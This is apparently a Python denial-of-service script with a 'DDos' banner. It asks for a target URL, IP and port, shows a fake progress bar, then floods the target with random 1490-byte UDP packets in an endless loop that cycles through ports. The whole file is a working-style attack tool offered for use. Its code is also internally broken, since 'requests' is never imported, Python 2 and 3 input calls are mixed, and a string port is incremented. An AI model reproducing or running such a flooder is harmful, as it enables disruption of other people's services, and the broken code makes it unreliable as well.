import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos")
print("""\033[94m
███████████████████████
▀─▄▄▀█▄─▄▄▀█─▄▄─█─▄▄▄▄█
█─██─██─██─█─██─█▄▄▄▄─█
▀▄▄▄▄▀▀▄▄▄▄▀▄▄▄▄▀▄▄▄▄▄▀

""")
#ip
url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
url_chek =requests.get(url)
ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
print(ip)
print()
ip = raw_input("\033[94m IP Target \033[1;31;40m  ==> : \033[0m")
port = input(" \033[94m Port Target \033[1;31;40m ==> : \033[0m")

os.system("clear")
os.system("figlet Attack Starting")
print( "[                    ] 0% ")
time.sleep(2)
print( "[=====               ] 25%")
time.sleep(2)
print( "[==========          ] 50%")
time.sleep(2)
print( "[===============     ] 75%")
time.sleep(2)
print( "[====================] 100%")
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print( "Sent %s packet to %s port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
